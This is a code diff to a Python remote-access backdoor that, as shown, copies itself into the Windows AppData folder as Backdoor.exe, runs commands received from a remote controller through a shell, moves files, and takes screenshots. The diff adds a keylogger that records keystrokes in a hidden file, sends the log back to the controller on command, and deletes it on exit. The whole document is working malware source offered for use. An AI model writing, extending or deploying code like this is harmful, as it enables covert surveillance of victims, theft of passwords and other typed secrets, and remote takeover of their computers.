@@ -9,6 +9,8 @@ import sys
 import base64
 import requests
 import ctypes
+import keylogger
+import threading
 from mss import mss
 
 def reliable_send(data):
@@ -56,15 +58,22 @@ def shell():
 	while True:
 		command = reliable_recv()
 		if command == "q":
+			try:
+				os.remove(keylogger_path)
+			except: 
+				continue
 			break
 		elif command == "help":
 			help_options = ''' 
-			download path --> Download a file from target PC
-			upload path   --> Upload a file to target PC
-			get url       --> Download a file to target PC from any website
-			start path    --> Start program on target PC
-			screenshot    --> Take a screenshot of target PC
-			check         --> Check for administrator privileges
+			    download <path>   → Download file from target
+			    upload <path>     → Upload file to target
+			    get <url>         → Download from URL
+			    start <exe>       → Run a program
+			    screenshot        → Take screenshot
+			    check             → Check admin rights
+			    keylog_start      → Start keylogger
+			    keylog_dump       → Show keylogs
+			    q                 → Quit
 			'''
 			reliable_send(help_options)
 		elif command[:2] == "cd" and len(command) > 1:
@@ -106,6 +115,12 @@ def shell():
 				reliable_send(admin)
 			except:
 				reliable_send("can't perform the check")
+		elif command[:12] == "keylog_start":
+			t1 = threading.Thread(target=keylogger.start)
+			t1.start()
+		elif command[:11] == "keylog_dump":
+			fn = open(keylogger_path,"r")
+			reliable_send(fn.read())
 		else:
 			try:
 				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -113,7 +128,8 @@ def shell():
 				reliable_send(result)
 			except:
 				reliable_send("!! can't execute that command !!")
-				
+	
+keylogger_path = os.environ["appdata"] + "\\keylogger.txt"			
 location = os.environ["appdata"] + "\\Backdoor.exe"
 if not os.path.exists(location):
 	shutil.copyfile(sys.executable, location)
